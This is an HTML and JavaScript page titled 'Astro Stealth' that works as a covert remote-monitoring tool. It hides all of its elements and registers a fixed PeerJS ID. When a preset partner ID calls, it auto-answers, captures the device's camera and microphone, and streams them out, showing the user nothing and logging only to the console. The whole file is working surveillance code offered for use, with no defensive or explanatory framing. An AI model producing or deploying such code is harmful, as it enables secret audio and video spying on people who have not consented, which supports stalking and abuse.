<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth</title>
    <style>
        /* Complete invisibility */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        
        /* Hidden video elements */
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
        
        audio {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>
    <video id="remoteVideo" autoplay playsinline></video>

    <script>
        // ============ STEALTH CONFIGURATION ============
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        const AUTO_ACCEPT_CALLS = true;     // Auto-accept all monitoring requests
        const SEND_AUDIO = true;             // Send audio from stealth device
        const SEND_VIDEO = true;             // Send video from stealth device
        // ================================================
        
        let peer = null;
        let currentCall = null;
        let localStream = null;
        let reconnectAttempts = 0;
        const MAX_RECONNECTS = 5;
        
        // Silent logging (only to console, no UI)
        function log(msg, type = 'info') {
            const prefix = type === 'error' ? '❌' : (type === 'warn' ? '⚠️' : '✅');
            console.log(`[STEALTH] ${prefix} ${msg}`);
        }
        
        async function getMediaStream() {
            const constraints = {
                audio: SEND_AUDIO,
                video: SEND_VIDEO ? {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } : false
            };
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                log(`Media acquired - Audio: ${SEND_AUDIO}, Video: ${SEND_VIDEO}`);
                return stream;
            } catch (e) {
                if (e.name === 'NotAllowedError') {
                    log('Camera/Mic permission denied', 'error');
                } else {
                    log(`Media error: ${e.message}`, 'error');
                }
                throw e;
            }
        }
        
        function handleIncomingCall(call) {
            const isVideo = call.metadata?.type === 'video';
            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} monitoring request`, 'info');
            
            if (!AUTO_ACCEPT_CALLS) {
                log('Call rejected (auto-accept disabled)', 'warn');
                call.close();
                return;
            }
            
            // Get stealth device's media stream
            getMediaStream().then(stream => {
                localStream = stream;
                
                // Show local video if enabled (hidden element)
                if (SEND_VIDEO && stream.getVideoTracks().length > 0) {
                    document.getElementById('localVideo').srcObject = stream;
                }
                
                // Answer call with stealth device's stream
                call.answer(stream);
                currentCall = call;
                
                // Handle remote stream (not needed for stealth, but must handle)
                call.on('stream', (remoteStream) => {
                    // Remote stream is from controller - ignore or play silently
                    if (remoteStream.getAudioTracks().length > 0) {
                        const silentAudio = new Audio();
                        silentAudio.srcObject = remoteStream;
                        silentAudio.volume = 0; // Mute completely
                        silentAudio.play().catch(() => {});
                    }
                    log(`${isVideo ? 'Video' : 'Audio'} monitoring ACTIVE`, 'success');
                });
                
                call.on('close', () => {
                    log(`${isVideo ? 'Video' : 'Audio'} monitoring ended`);
                    endCall();
                });
                
                call.on('error', (err) => {
                    log(`Call error: ${err}`, 'error');
                    endCall();
                });
                
            }).catch(err => {
                log(`Failed to answer call: ${err.message}`, 'error');
                call.close();
            });
        }
        
        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
                localStream = null;
            }
            if (currentCall) {
                currentCall.close();
                currentCall = null;
            }
            document.getElementById('localVideo').srcObject = null;
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing stealth device as ${MY_ID}`);
            peer = new Peer(MY_ID);
            
            peer.on('open', (id) => {
                log(`Stealth device ACTIVE - ID: ${MY_ID}`);
                log(`Waiting for connection from ${PARTNER_ID}...`);
                reconnectAttempts = 0;
            });
            
            peer.on('call', (call) => {
                if (call.peer === PARTNER_ID) {
                    handleIncomingCall(call);
                } else {
                    log(`Rejected call from unknown: ${call.peer}`, 'warn');
                    call.close();
                }
            });
            
            peer.on('disconnected', () => {
                log('Connection lost', 'warn');
                if (reconnectAttempts < MAX_RECONNECTS) {
                    reconnectAttempts++;
                    log(`Reconnecting (${reconnectAttempts}/${MAX_RECONNECTS})...`);
                    setTimeout(() => {
                        if (peer) peer.reconnect();
                    }, 3000);
                } else {
                    log('Max reconnects reached - refresh page to restart', 'error');
                }
            });
            
            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') {
                    log(`ID ${MY_ID} in use - retrying in 5s...`, 'warn');
                    setTimeout(() => initPeer(), 5000);
                } else if (err.type === 'network') {
                    log('Network error - reconnecting...', 'warn');
                    if (peer) peer.reconnect();
                }
            });
        }
        
        // Auto-start stealth service
        log('=== ASTRO STEALTH SERVICE ===');
        log(`Configuration:`);
        log(`  - ID: ${MY_ID}`);
        log(`  - Target: ${PARTNER_ID}`);
        log(`  - Send Audio: ${SEND_AUDIO}`);
        log(`  - Send Video: ${SEND_VIDEO}`);
        log(`  - Auto-accept: ${AUTO_ACCEPT_CALLS}`);
        
        initPeer();
        
        // Keep service alive
        setInterval(() => {
            if (peer && !peer.disconnected && currentCall) {
                console.log('[STEALTH] Heartbeat - monitoring active');
            }
        }, 30000);
        
        // Clean shutdown
        window.addEventListener('beforeunload', () => {
            if (currentCall) currentCall.close();
            if (peer) peer.destroy();
            if (localStream) localStream.getTracks().forEach(track => track.stop());
        });
    </script>
</body>
</html>
